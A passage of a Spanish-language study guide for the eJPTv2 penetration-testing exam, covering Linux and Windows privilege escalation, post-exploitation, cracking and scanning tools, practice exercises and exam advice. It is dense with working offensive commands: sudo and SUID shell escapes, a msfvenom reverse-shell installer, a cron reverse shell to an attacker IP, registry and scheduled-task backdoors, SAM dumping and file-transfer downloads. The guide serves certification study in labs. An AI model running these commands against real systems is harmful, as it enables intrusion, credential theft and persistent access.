# Ejemplos comunes
/usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/vim -c ':!/bin/sh'
/usr/bin/nmap --interactive
nmap> !sh

# Bash con SUID
bash -p
```

**2. Sudo Misconfigurations**:
```bash
# Ver permisos sudo
sudo -l

# Ejemplos de explotación
sudo /usr/bin/find . -exec /bin/sh \; -quit
sudo /usr/bin/vim -c ':!/bin/sh'
sudo /usr/bin/python -c 'import os; os.system("/bin/sh")'
sudo /usr/bin/less /etc/profile
!/bin/sh

# LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so programa
```

**3. Cron Jobs**:
```bash
# Ver cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Buscar scripts ejecutados por cron
find /etc/cron* -type f -perm -o+w
```

**4. Capabilities**:
```bash
# Listar capabilities
getcap -r / 2>/dev/null

# Ejemplo: python con cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**5. Kernel Exploits**:
```bash
# Ver versión del kernel
uname -a

# Buscar exploits
searchsploit linux kernel 4.4.0

# Exploits comunes
# DirtyCow (CVE-2016-5195)
# Dirty Pipe (CVE-2022-0847)
```

**6. Passwords y Credenciales**:
```bash
# Buscar archivos con "password"
grep -r "password" /home 2>/dev/null
grep -r "pass" /var/www 2>/dev/null

# Archivos de configuración
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
find / -name "*.conf" 2>/dev/null

# Claves SSH
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

#### Herramientas de Enumeración Automatizada

**LinPEAS** (mi favorita):
```bash
# Descargar y ejecutar
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# O transferir y ejecutar
wget http://10.10.10.10/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**LinEnum**:
```bash
wget http://10.10.10.10/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

**Linux Smart Enumeration (lse.sh)**:
```bash
wget http://10.10.10.10/lse.sh
chmod +x lse.sh
./lse.sh -l 1  # Level 1 (rápido)
./lse.sh -l 2  # Level 2 (completo)
```

### 4.2 Escalado de Privilegios en Windows

#### Enumeración Inicial

**Información del sistema**:
```cmd
# Sistema
systeminfo
hostname
ver

# Usuario actual
whoami
whoami /priv
whoami /groups

# Usuarios locales
net user
net user usuario

# Grupos
net localgroup
net localgroup Administrators
```

**PowerShell**:
```powershell
Get-ComputerInfo
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
```

#### Vectores de Escalado

**1. Unquoted Service Paths**:
```cmd
# Buscar servicios con rutas sin comillas
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'}

# Explotar
# Si el servicio es: C:\Program Files\My Service\service.exe
# Puedes crear: C:\Program.exe o C:\Program Files\My.exe
```

**2. Weak Service Permissions**:
```cmd
# Ver permisos de servicio
sc qc servicio
sc sdshow servicio

# Cambiar binario del servicio
sc config servicio binPath= "C:\temp\shell.exe"
sc stop servicio
sc start servicio

# PowerShell
Get-Service
Get-Acl -Path "HKLM:\System\CurrentControlSet\Services\servicio" | Format-List
```

**3. AlwaysInstallElevated**:
```cmd
# Verificar si está habilitado
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Si ambos son 1, crear MSI malicioso
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

**4. Scheduled Tasks**:
```cmd
# Listar tareas programadas
schtasks /query /fo LIST /v

# Buscar tareas con permisos débiles
icacls "C:\ruta\script.bat"

# PowerShell
Get-ScheduledTask
```

**5. Registry Exploits**:
```cmd
# AutoRuns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Agregar programa al inicio
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\shell.exe"
```

**6. Passwords y Credenciales**:
```cmd
# Buscar archivos con credenciales
findstr /si password *.txt *.xml *.ini *.config

# Unattend.xml
dir /s *unattend.xml
type C:\Windows\Panther\Unattend.xml

# Credenciales guardadas
cmdkey /list
runas /savecred /user:administrator cmd.exe

# SAM y SYSTEM
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
```

**7. Token Impersonation** (con Meterpreter):
```bash
# En Meterpreter
getuid
getprivs
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

#### Herramientas de Enumeración Automatizada

**WinPEAS** (mi favorita):
```cmd
# Descargar y ejecutar
winpeas.exe

# Con colores
winpeas.exe cmd

# Guardar output
winpeas.exe > output.txt
```

**PowerUp.ps1**:
```powershell
# Importar
Import-Module .\PowerUp.ps1

# Ejecutar todos los checks
Invoke-AllChecks

# Checks específicos
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
```

**Windows Exploit Suggester**:
```bash
# En tu máquina
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt
```

**Seatbelt**:
```cmd
Seatbelt.exe -group=all
Seatbelt.exe -group=system
Seatbelt.exe -group=user
```

### 4.3 Técnicas de Post-Explotación

**Transferir archivos**:

**Linux**:
```bash
# Servidor HTTP (atacante)
python3 -m http.server 8000

# Descargar (víctima)
wget http://10.10.10.10:8000/archivo
curl http://10.10.10.10:8000/archivo -o archivo
```

**Windows**:
```cmd
# PowerShell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10:8000/archivo.exe','C:\temp\archivo.exe')"

# Certutil
certutil -urlcache -f http://10.10.10.10:8000/archivo.exe archivo.exe

# SMB
copy \\10.10.10.10\share\archivo.exe C:\temp\
```

**Persistencia básica**:

**Linux**:
```bash
# Cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'" | crontab -

# SSH key
mkdir ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

**Windows**:
```cmd
# Registry Run key
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\shell.exe"

# Scheduled task
schtasks /create /tn "Backdoor" /tr "C:\temp\shell.exe" /sc onlogon /ru System
```

### 4.4 Buenas Prácticas

**Durante el examen**:
- ✅ Documenta TODO (comandos, outputs, hallazgos)
- ✅ Toma screenshots de cada paso importante
- ✅ Guarda todos los hashes y credenciales
- ✅ Anota IPs, puertos y servicios
- ✅ Mantén un checklist de lo que has probado

**Metodología**:
1. Enumeración exhaustiva
2. Identificar vectores de ataque
3. Probar exploits conocidos
4. Escalar privilegios
5. Documentar todo

### 4.5 Resumen y Recursos

**Linux PrivEsc - Checklist**:
- ✅ SUID binaries
- ✅ Sudo misconfigurations
- ✅ Cron jobs
- ✅ Capabilities
- ✅ Kernel exploits
- ✅ Passwords en archivos

**Windows PrivEsc - Checklist**:
- ✅ Unquoted service paths
- ✅ Weak service permissions
- ✅ AlwaysInstallElevated
- ✅ Scheduled tasks
- ✅ Registry exploits
- ✅ Token impersonation

**Recursos**:
- [GTFOBins](https://gtfobins.github.io/) - Linux binaries
- [LOLBAS](https://lolbas-project.github.io/) - Windows binaries
- [HackTricks - Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [HackTricks - Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

> **💡 Mi consejo**: Practica escalado de privilegios en MUCHAS máquinas. Es la habilidad más importante para el eJPTv2.

[⬆️ Volver al inicio](#tabla-de-contenidos)

---

## Parte 5: Referencia de Herramientas

### 5.1 Herramientas de Escaneo

**Nmap** - Ya cubierto en Parte 2

**Masscan** - Escaneo ultra rápido:
```bash
sudo masscan -p1-65535 192.168.1.0/24 --rate=1000
sudo masscan -p80,443,8080 192.168.1.0/24 --rate=10000
```

**Rustscan** - Nmap con esteroides:
```bash
rustscan -a 192.168.1.100 -- -sV -sC
```

### 5.2 Herramientas de Fuerza Bruta

**Hydra** - Brute force multi-protocolo:
```bash
# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# FTP
hydra -l admin -P passwords.txt ftp://192.168.1.100

# HTTP POST
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.100
```

**John the Ripper** - Password cracking:
```bash
# Crackear hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Mostrar crackeados
john --show hashes.txt

# Formatos específicos
john --format=raw-md5 hashes.txt
john --format=nt hashes.txt
```

**Hashcat** - GPU password cracking:
```bash
# MD5
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# Listar modos
hashcat --help | grep -i "hash"
```

### 5.3 Herramientas de Red

**Netcat** - La navaja suiza:
```bash
# Listener
nc -lvnp 4444

# Conectar
nc 192.168.1.100 4444

# Transferir archivo
# Receptor
nc -lvnp 4444 > archivo
# Emisor
nc 192.168.1.100 4444 < archivo

# Banner grabbing
nc 192.168.1.100 80
GET / HTTP/1.1
Host: ejemplo.com
```

**Socat** - Netcat mejorado:
```bash
# Listener
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Reverse shell estable
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**Wireshark/tcpdump** - Captura de tráfico:
```bash
# tcpdump
tcpdump -i eth0
tcpdump -i eth0 -w captura.pcap
tcpdump -i eth0 port 80

# Leer captura
tcpdump -r captura.pcap
```

### 5.4 Resumen y Recursos

**Herramientas esenciales para eJPTv2**:
- ✅ Nmap (escaneo)
- ✅ Gobuster (web enum)
- ✅ Hydra (brute force)
- ✅ Metasploit (explotación)
- ✅ Netcat (shells)
- ✅ LinPEAS/WinPEAS (privesc)
- ✅ sqlmap (SQLi)
- ✅ Burp Suite (web testing)

[⬆️ Volver al inicio](#tabla-de-contenidos)

---

## Parte 6: Ejercicios Prácticos

### 6.1 Ejercicio 1: Reconocimiento y Enumeración Básica

**Escenario**: Tienes una IP objetivo (192.168.1.100). Realiza reconocimiento completo.

**Pasos**:
1. Ping sweep para verificar que está activo
2. Nmap full port scan
3. Enumerar servicios encontrados
4. Documentar hallazgos

**Solución**:
```bash
# 1. Verificar host activo
ping -c 1 192.168.1.100

# 2. Escaneo completo
nmap -sS -sV -p- 192.168.1.100 -oA escaneo_completo

# 3. Enumerar servicios específicos
# Si hay SMB (445)
enum4linux -a 192.168.1.100

# Si hay HTTP (80)
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt

# Si hay FTP (21)
nmap --script=ftp-anon -p 21 192.168.1.100

# 4. Documentar en notas.txt
```

### 6.2 Ejercicio 2: Explotación de Aplicaciones Web

**Escenario**: Aplicación web con formulario de login vulnerable a SQLi.

**Pasos**:
1. Identificar SQLi
2. Bypass de autenticación
3. Extraer datos de la base de datos
4. Obtener shell

**Solución**:
```bash
# 1. Probar SQLi básico
' OR 1=1--
admin' OR '1'='1'--

# 2. sqlmap
sqlmap -u "http://192.168.1.100/login.php" --data="user=admin&pass=test" --dbs

# 3. Dump datos
sqlmap -u "http://192.168.1.100/login.php" --data="user=admin&pass=test" -D database -T users --dump

# 4. Intentar escribir shell
sqlmap -u "http://192.168.1.100/login.php" --data="user=admin&pass=test" --os-shell
```

### 6.3 Ejercicio 3: Escalado de Privilegios en Linux

**Escenario**: Tienes shell como usuario www-data. Necesitas root.

**Pasos**:
1. Enumeración inicial
2. Buscar vectores de escalado
3. Explotar
4. Obtener root

**Solución**:
```bash
# 1. Enumeración
whoami
id
sudo -l
uname -a

# 2. Buscar SUID
find / -perm -4000 -type f 2>/dev/null

# 3. Transferir LinPEAS
wget http://10.10.10.10/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# 4. Explotar (ejemplo: sudo vim)
sudo /usr/bin/vim -c ':!/bin/bash'
```

### 6.4 Ejercicio 4: Escalado de Privilegios en Windows

**Escenario**: Tienes shell como usuario normal. Necesitas SYSTEM.

**Pasos**:
1. Enumeración inicial
2. Buscar vectores de escalado
3. Explotar
4. Obtener SYSTEM

**Solución**:
```cmd
# 1. Enumeración
whoami /priv
systeminfo

# 2. Transferir WinPEAS
certutil -urlcache -f http://10.10.10.10/winpeas.exe winpeas.exe
winpeas.exe

# 3. Buscar servicios vulnerables
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\"

# 4. Explotar (ejemplo: unquoted service path)
sc config servicio binPath= "C:\temp\shell.exe"
sc stop servicio
sc start servicio
```

### 6.5 Ejercicio 5: Prueba de Penetración Multi-Etapa

**Escenario**: Red completa (192.168.1.0/24). Compromete todos los hosts.

**Metodología completa**:
1. Reconocimiento de red
2. Identificar hosts activos
3. Escanear servicios
4. Explotar vulnerabilidades
5. Escalar privilegios
6. Movimiento lateral
7. Documentar todo

### 6.6 Resumen y Recursos

**Plataformas de práctica**:
- [HackTheBox](https://www.hackthebox.eu/) - Máquinas realistas
- [TryHackMe](https://tryhackme.com/) - Rooms guiadas
- [VulnHub](https://www.vulnhub.com/) - VMs descargables
- [PentesterLab](https://pentesterlab.com/) - Ejercicios web
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Web vulnerabilities

> **💡 Mi recomendación**: Haz al menos 20 máquinas fáciles antes del examen. Practica hasta que el proceso sea automático.

[⬆️ Volver al inicio](#tabla-de-contenidos)

---

## Parte 7: Preparación para el Examen

### 7.1 Consejos y Trucos

**Antes del examen**:
- ✅ Practica en HackTheBox/TryHackMe (mínimo 20 máquinas)
- ✅ Domina Nmap, Gobuster, Metasploit, Netcat
- ✅ Practica escalado de privilegios (Linux y Windows)
- ✅ Prepara tu cheatsheet personal
- ✅ Configura tu entorno de trabajo (Kali VM)
- ✅ Descansa bien el día anterior

**Durante el examen**:
- ✅ Lee TODAS las instrucciones cuidadosamente
- ✅ Gestiona tu tiempo (20 horas es mucho, pero pasa rápido)
- ✅ Documenta TODO (screenshots, comandos, outputs)
- ✅ Toma descansos cada 2-3 horas
- ✅ Si te atascas, pasa a otra máquina y vuelve después
- ✅ Enumera, enumera, enumera (80% del trabajo)

**Metodología para cada máquina**:
1. Nmap full scan
2. Enumerar servicios
3. Buscar vulnerabilidades
4. Explotar
5. Obtener shell
6. Escalar privilegios
7. Documentar flags

**Gestión del tiempo**:
- Primeras 2 horas: Reconocimiento de toda la red
- Siguientes 10 horas: Explotación y escalado
- Últimas 8 horas: Máquinas difíciles y documentación

### 7.2 Errores Comunes

1. **No enumerar lo suficiente** - El error #1
   - Solución: Dedica tiempo a la enumeración, no te apresures

2. **No documentar** - Pierdes evidencia
   - Solución: Screenshots de cada paso importante

3. **No leer las instrucciones** - Pierdes puntos fáciles
   - Solución: Lee TODO cuidadosamente

4. **Usar exploits sin entender** - Pierdes tiempo
   - Solución: Entiende qué hace cada exploit

5. **No tomar descansos** - Te cansas y cometes errores
   - Solución: Descansa cada 2-3 horas

6. **Olvidar flags** - No documentas las respuestas
   - Solución: Copia cada flag inmediatamente

7. **No probar credenciales encontradas** - Pierdes accesos fáciles
   - Solución: Prueba cada credencial en todos los servicios

8. **Rendirse demasiado pronto** - La respuesta está ahí
   - Solución: Vuelve a enumerar, siempre hay algo que te perdiste

9. **No estabilizar shells** - Pierdes la sesión
   - Solución: Estabiliza inmediatamente con Python PTY

10. **Complicar las cosas** - La solución suele ser simple
    - Solución: Piensa en lo obvio primero

### 7.3 Plan de Estudio

**4 semanas antes**:
- Semana 1: Fundamentos (redes, Linux, Windows)
- Semana 2: Reconocimiento y enumeración (10 máquinas)
- Semana 3: Explotación y shells (10 máquinas)
- Semana 4: Escalado de privilegios (10 máquinas)

**1 semana antes**:
- Repasa tus notas
- Practica 2-3 máquinas completas
- Prepara tu cheatsheet
- Configura tu entorno

**1 día antes**:
- Descansa
- Revisa tu cheatsheet
- Prepara snacks y bebidas
- Duerme bien

### 7.4 Resumen y Motivación

**Lo que necesitas dominar**:
- ✅ Nmap (escaneo completo)
- ✅ Enumeración de servicios (SMB, HTTP, FTP, SSH)
- ✅ Explotación web (SQLi, LFI, file upload)
- ✅ Metasploit básico
- ✅ Shells (obtener y estabilizar)
- ✅ Escalado de privilegios (Linux y Windows)
- ✅ Documentación

**Recursos finales**:
- [eJPT Official](https://elearnsecurity.com/product/ejpt-certification/)
- [INE Free Course](https://ine.com/)
- Mis apuntes (esta guía)

> **💡 Mensaje final**: Has llegado hasta aquí, lo que significa que tienes la determinación necesaria. El eJPTv2 es alcanzable si practicas. No es sobre ser el más inteligente, es sobre ser persistente. Cada máquina que resuelves te acerca más. Cada error es una lección. Tú puedes hacerlo. 
>
> **- jotatito05** 💪

[⬆️ Volver al inicio](#tabla-de-contenidos)

---

## Parte 8: Recursos Adicionales

### 8.1 Referencias y Recursos

**Documentación Oficial**:
- [Nmap Official Guide](https://nmap.org/book/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Linux man pages](https://man7.org/linux/man-pages/)
- [Microsoft Docs](https://docs.microsoft.com/)

**Cheat Sheets y Referencias**:
- [HackTricks](https://book.hacktricks.xyz/) - LA BIBLIA del pentesting
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins](https://gtfobins.github.io/) - Linux binaries
- [LOLBAS](https://lolbas-project.github.io/) - Windows binaries
- [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

**Wordlists**:
- [SecLists](https://github.com/danielmiessler/SecLists) - Colección completa
- RockYou: `/usr/share/wordlists/rockyou.txt`
- Dirb: `/usr/share/wordlists/dirb/`
- Dirbuster: `/usr/share/wordlists/dirbuster/`

**Plataformas de Práctica**:
- [HackTheBox](https://www.hackthebox.eu/) - Máquinas realistas (RECOMENDADO)
- [TryHackMe](https://tryhackme.com/) - Rooms guiadas (EXCELENTE PARA EMPEZAR)
- [VulnHub](https://www.vulnhub.com/) - VMs descargables
- [PentesterLab](https://pentesterlab.com/) - Ejercicios web
- [PortSwigger Academy](https://portswigger.net/web-security) - Web vulnerabilities
- [OverTheWire](https://overthewire.org/) - Wargames (Bandit para Linux)

**Libros Recomendados**:
- "The Web Application Hacker's Handbook" - Stuttard & Pinto
- "Penetration Testing" - Georgia Weidman
- "The Hacker Playbook 3" - Peter Kim
- "RTFM: Red Team Field Manual" - Ben Clark
- "Linux Basics for Hackers" - OccupyTheWeb

**Canales de YouTube**:
- IppSec - Walkthroughs de HackTheBox
- John Hammond - Tutoriales y CTFs
- LiveOverflow - Seguridad y hacking
- The Cyber Mentor - Cursos completos
- HackerSploit - Tutoriales de pentesting

**Comunidades**:
- [Reddit r/netsec](https://www.reddit.com/r/netsec/)
- [Reddit r/AskNetsec](https://www.reddit.com/r/AskNetsec/)
- [HackTheBox Forums](https://forum.hackthebox.eu/)
- [Discord de InfoSec](https://discord.gg/infosec)
- Twitter #infosec #cybersecurity

**Blogs y Sitios**:
- [0xdf hacks stuff](https://0xdf.gitlab.io/) - Writeups excelentes
- [Rana Khalil](https://rana-khalil.gitbook.io/) - Writeups y guías
- [IppSec Rocks](https://ippsec.rocks/) - Buscador de técnicas
- [Exploit-DB](https://www.exploit-db.com/) - Base de datos de exploits

### 8.2 Resumen

**Has completado la guía de estudio eJPTv2!** 🎉

**Lo que has aprendido**:
- ✅ Fundamentos de redes y sistemas operativos
- ✅ Reconocimiento pasivo y activo
- ✅ Enumeración de servicios
- ✅ Técnicas de explotación
- ✅ Escalado de privilegios (Linux y Windows)
- ✅ Post-explotación
- ✅ Metodología completa de pentesting

**Próximos pasos**:
1. Practica en HackTheBox/TryHackMe (mínimo 20 máquinas)
2. Crea tu propio cheatsheet personalizado
3. Repasa esta guía regularmente
4. Únete a comunidades de seguridad
5. Cuando te sientas listo, ¡agenda tu examen!

**Recuerda**:
- La práctica hace al maestro
- Cada error es una oportunidad de aprender
- La enumeración es el 80% del trabajo
- Documenta TODO
- Nunca te rindas

> **💡 Mensaje final de jotatito05**:
>
> Cuando empecé a estudiar para el eJPTv2, me sentía abrumado por la cantidad de información. Pero con dedicación, práctica constante y la ayuda de la comunidad, lo logré. Ahora es tu turno.
>
> Estos apuntes son el resultado de mi viaje de aprendizaje. Los comparto contigo con la esperanza de que tu camino sea un poco más fácil que el mío. Úsalos, practica, y cuando obtengas tu certificación, comparte tu conocimiento con otros.
>
> La comunidad de ciberseguridad es fuerte porque nos ayudamos mutuamente. Hoy yo te ayudo con estos apuntes, mañana tú ayudarás a alguien más.
>
> ¡Mucha suerte en tu examen! Tú puedes hacerlo. 🚀
>
> **- jotatito05**

[⬆️ Volver al inicio](#tabla-de-contenidos)

---

## Apéndices

### A. Cheatsheet de Comandos

**Reconocimiento**:
```bash
# Nmap
nmap -sS -sV -p- IP -oA scan
nmap -A -T4 IP
nmap --script=vuln IP

# Gobuster
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Enum4linux
enum4linux -a IP

# theHarvester
theHarvester -d domain.com -b google,bing,crtsh
```

**Explotación**:
```bash
# SQLi
sqlmap -u "http://IP/page.php?id=1" --dbs
sqlmap -u "http://IP/page.php?id=1" -D db -T users --dump

# Metasploit
msfconsole
search exploit
use exploit/path
set RHOSTS IP
set LHOST IP
exploit

# Reverse shell
nc -lvnp 4444
bash -i >& /dev/tcp/IP/4444 0>&1
```

**Escalado de Privilegios**:
```bash
# Linux
sudo -l
find / -perm -4000 -type f 2>/dev/null
wget http://IP/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# Windows
whoami /priv
systeminfo
certutil -urlcache -f http://IP/winpeas.exe winpeas.exe
winpeas.exe
```

**Transferencia de Archivos**:
```bash
# Servidor (atacante)
python3 -m http.server 8000

# Linux (víctima)
wget http://IP:8000/file
curl http://IP:8000/file -o file

# Windows (víctima)
certutil -urlcache -f http://IP:8000/file.exe file.exe
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://IP:8000/file.exe','file.exe')"
```

### B. Tabla de Referencia de Puertos

| Puerto | Servicio | Descripción | Comandos de Enumeración |
|--------|----------|-------------|------------------------|
| 21 | FTP | File Transfer Protocol | `ftp IP`, `nmap --script=ftp-anon -p 21 IP` |
| 22 | SSH | Secure Shell | `ssh user@IP`, `hydra -l user -P pass.txt ssh://IP` |
| 23 | Telnet | Telnet | `telnet IP` |
| 25 | SMTP | Simple Mail Transfer | `nc IP 25`, `smtp-user-enum -M VRFY -U users.txt -t IP` |
| 53 | DNS | Domain Name System | `dig @IP domain.com`, `dnsrecon -d domain.com` |
| 80 | HTTP | Web Server | `gobuster dir -u http://IP -w wordlist.txt` |
| 110 | POP3 | Post Office Protocol | `nc IP 110` |
| 111 | RPCbind | RPC Bind | `rpcinfo -p IP` |
| 135 | MSRPC | Microsoft RPC | `rpcclient -U "" IP` |
| 139 | NetBIOS | NetBIOS Session | `enum4linux -a IP` |
| 143 | IMAP | Internet Message Access | `nc IP 143` |
| 161 | SNMP | Simple Network Management | `snmpwalk -v 2c -c public IP` |
| 389 | LDAP | Lightweight Directory | `ldapsearch -x -h IP -b "dc=domain,dc=com"` |
| 443 | HTTPS | HTTP Secure | `gobuster dir -u https://IP -w wordlist.txt` |
| 445 | SMB | Server Message Block | `smbclient -L //IP -N`, `enum4linux -a IP` |
| 1433 | MSSQL | Microsoft SQL Server | `sqsh -S IP -U sa -P password` |
| 2049 | NFS | Network File System | `showmount -e IP` |
| 3306 | MySQL | MySQL Database | `mysql -h IP -u root -p` |
| 3389 | RDP | Remote Desktop | `xfreerdp /v:IP /u:user /p:pass` |
| 5432 | PostgreSQL | PostgreSQL Database | `psql -h IP -U postgres` |
| 5900 | VNC | Virtual Network Computing | `vncviewer IP` |
| 6379 | Redis | Redis Database | `redis-cli -h IP` |
| 8080 | HTTP-Alt | Alternative HTTP | `gobuster dir -u http://IP:8080 -w wordlist.txt` |
| 27017 | MongoDB | MongoDB Database | `mongo IP:27017` |

---

## Notas Finales

**Versión**: 1.0  
**Última actualización**: 2024  
**Autor**: jotatito05  
**Licencia**: Compartido libremente para fines educativos

**Contribuciones**:
Si encuentras errores o quieres contribuir:
- Reporta issues
- Sugiere mejoras
- Comparte tu experiencia

**Agradecimientos**:
A toda la comunidad de ciberseguridad que comparte conocimiento libremente. Esta guía no sería posible sin:
- HackTheBox y TryHackMe por las plataformas de práctica
- Los creadores de herramientas open source
- Los bloggers y YouTubers que comparten writeups
- La comunidad de Reddit, Discord y Twitter

**Disclaimer**:
Esta guía es para fines educativos únicamente. El uso de estas técnicas sin autorización es ilegal. Siempre obtén permiso explícito antes de realizar pruebas de penetración.

---

**¡Buena suerte en tu examen eJPTv2!** 🎯

**- jotatito05**

[⬆️ Volver al inicio](#tabla-de-contenidos)
